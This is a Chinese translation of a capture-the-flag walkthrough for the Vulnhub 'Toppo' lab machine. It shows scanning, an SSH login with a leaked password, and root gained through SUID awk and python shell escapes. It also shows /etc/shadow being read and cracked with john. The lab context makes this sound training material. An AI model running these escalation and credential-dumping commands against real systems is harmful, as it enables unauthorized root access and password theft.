# Vulnhub 报道— Toppo

> 原文：<https://infosecwriteups.com/vulnhub-toppo-writeup-1ac541bf185a?source=collection_archive---------0----------------------->

*这是从*[*Vulnhub*](https://www.vulnhub.com)*起的机器* [*Toppo*](https://www.vulnhub.com/entry/toppo-1,245/) *。*

# 摘要

Toppo 是基于 Linux 平台的初学者友好型机器。在管理员 note.txt 的帮助下，获得了用户并利用 SUID 可执行文件获得了根。

> 机器作者:[Hadi](https://twitter.com/@h4d3s99)机器类型:Linux
> 机器级别:初学者

![](img/678eb590baa989da9ffea84505a207e4.png)

IP 地址已给定，因此不需要网络发现。

# 扫描网络

```
nmap -sC -sV 192.168.0.103
```

![](img/7f8310c3d6f9392d7d5a35774e649f4a.png)

man nmap

![](img/1d2a55819578a1f799a7315262bce785.png)

Toppo 上的 nmap

# 端口 80 上的 Dirbuster

![](img/2752ed1b486464f1f2a343cc09ae53e9.png)

可怕的结果

得到了 admin 目录下的 notes.txt。

![](img/b6db1c52649c63aba38947714fea66c6.png)

/admin/notes.txt

上面的注释给了我们密码:- **12345ted123**

所以让我们试着猜测用户名**泰德**并试着登录 **ssh** 。

# 自己的用户

![](img/a018252f264cdabc9c8e0b0678801e40.png)

登录 ssh

```
$whoami ;id
```

![](img/93096b4e7085c1779f5706b01d521da7.png)

man whoami 身份证明（identification）

![](img/aa610bf44ca20eed7aa4ca3064e8e943.png)

自己的用户

# 权限提升

我使用这个脚本来找出权限提升的方法。

[](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) [## sleventyeleven/Linux priv checker

### 一个 Linux 特权提升检查脚本

github.com](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) 

```
$python -m SimpleHTTPServer
```

在本地启动 web 服务器以上传 toppo 机器上的 privchecker。

![](img/dbe61525fe8c8dad979818ced5fa29a1.png)![](img/7e90d0bddb050f17d03dfbd136a7ea79.png)

启动 python 服务器

寻找主机 IP 地址。

![](img/a111fe5c727686f4476621d3c62b7933.png)

主机 IP

**在机器上下载脚本(toppo)**

```
 $wget [http://192.168.0.105:8000/linuxprivchecker.py](http://192.168.0.105:8000/linuxprivchecker.py)
```

![](img/031bd43a82fe7f1bbecd9e68f893a399.png)

男子 wget

![](img/d33b173c489c3cc42371c3319441bf4f.png)

在 toppo 下载 privchecker

```
$chmod +x linuxprivchecker.py
$ ./linuxprivchecker.py
```

在 toppo 上运行脚本。

![](img/fc0fbb95428087d5e500c23f1c8ef11f.png)

运行 privchecker

它将提供一些方法来转义序列，我正在尝试使用 awk，你可以尝试任何一种。

![](img/2107f89f99d01d82f50ce233951a75ae.png)

输出

**根使用 awk**

```
$ awk 'BEGIN{system("/bin/sh")}'
```

![](img/791b71805d39de11874ae9f91cc2f73f.png)

男人 awk

![](img/da27c991684522872910d60b75de2fa5.png)

使用 awk 的所有者用户

**/bin/bash** 没有给我们 root，这是因为 bash 有权限提升保护。但是/bin/sh 里没有这个东西。

让我们尝试一种不同的权限提升方法，在互联网上搜索时，我找到了这篇文章。

[](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) [## 基本 Linux 权限提升

### 在开始之前，我想指出——我不是专家。据我所知，没有

blog.g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 

**Root 使用 python**

```
find / -perm -g**=**s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld **{}** \; 2>/dev/null
```

![](img/601d9cd810072c8d5651e11718cc683b.png)

从上面的 URL 抓取

![](img/b24c2f8c782af1882e75371f22b517f6.png)

找到烫发

python2.7 可以被利用。看到 SUID 了吗

```
$python2.7 -c “import pty; pty.spawn(‘/bin/sh’);”
```

![](img/50bbbd5610393a8d62faf203ce51b5f6.png)

拥有使用 python 的用户

**破解 root 密码**

```
$awk 'BEGIN{system("cat /etc/shadow")}'
```

![](img/8fd9a1a2cfe0938a79e61d1acb18076e.png)

/etc/shadow 文件

```
awk 'BEGIN{system("cat /etc/passwd")}'
```

![](img/fc7a6175f5d39ca83394974d91e28ec0.png)

/etc/passwd 文件

```
$unshadow passwd shadow < crack
```

![](img/746445991a04bf4c514a9805afcda5ba.png)

男子 unshadow

![](img/76c93321ae15ea4d2a504026ec3245d3.png)

取消阴影密码和阴影文件

```
john --wordlist /usr/share/john/password.lst crack
```

![](img/8e9b7e68d609d18d98b4c71248dd7f7c.png)

男人约翰

![](img/5ae5b1f2bdbaf540ba0b994a8bb7750c.png)

使用 john 查找散列类型

```
john --wordlist /usr/share/john/password.lst crack --format =sha512crypt
```

![](img/aacd35955c94f0af2afe1a6e3416f1e7.png)

使用 john 破解 root 密码

# 自己的根

![](img/196694a79a1045dca742547c4703284b.png)

使用密码拥有根目录

![](img/e79a635c8c8ea978ce929a20cae872d7.png)

旗

**0 wned lab { p 4 ssi0n _ c0me _ with _ pract 1ce }**

*感谢阅读！如果你喜欢这个故事，请* ***点击*** 👏 ***按钮，分享*** *帮助他人！欢迎发表评论*💬*下图。有反馈？下面我们连线上* [*推特*](https://twitter.com/yashanand155) *。*

[](https://twitter.com/yashanand155) [## inc0gnito (@yashanand155) |推特

### inc0gnito 的最新推文(@yashanand155)。CTF 玩家| | hack the box | | CTFs with @ ABS 0 lut 3 pwn 4g 3🚩。新德里…

twitter.com](https://twitter.com/yashanand155) [](https://medium.com/@yashanand155) [## 增量中等

### 从 inc0gnito 介质上读取文字。夺旗类游戏🚩|| HACKTHEBOX ||反转。每天，成千上万的人…

medium.com](https://medium.com/@yashanand155) 

## ❤️由[增加到](https://twitter.com/yashanand155)